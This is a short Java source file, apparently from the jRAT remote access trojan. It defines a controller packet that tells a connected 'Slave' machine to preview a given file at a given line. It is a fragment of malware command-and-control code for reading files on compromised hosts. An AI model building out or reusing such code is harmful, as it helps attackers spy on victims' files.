package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet60PreviewFile extends AbstractOutgoingPacket {

	private String file;
	private int line;

	public Packet60PreviewFile(String file, int line) {
		this.file = file;
		this.line = line;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(file);
		slave.writeInt(line);
	}

	@Override
	public short getPacketId() {
		return 60;
	}

}
